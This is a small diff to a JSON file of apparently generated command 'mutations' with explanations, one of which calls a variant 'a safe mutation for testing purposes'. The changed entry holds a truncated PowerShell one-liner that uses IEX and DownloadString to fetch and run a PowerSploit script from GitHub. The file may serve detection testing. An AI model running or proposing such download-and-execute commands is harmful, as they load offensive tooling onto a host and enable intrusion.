@@ -20,4 +20,6 @@
     "explanation": "This command uses the -Command flag explicitly, which is a syntactic variation of the original command. It is a safe mutation for testing purposes."
   },
   {
-    "output": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec
+    "output": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec"
+  }
+]
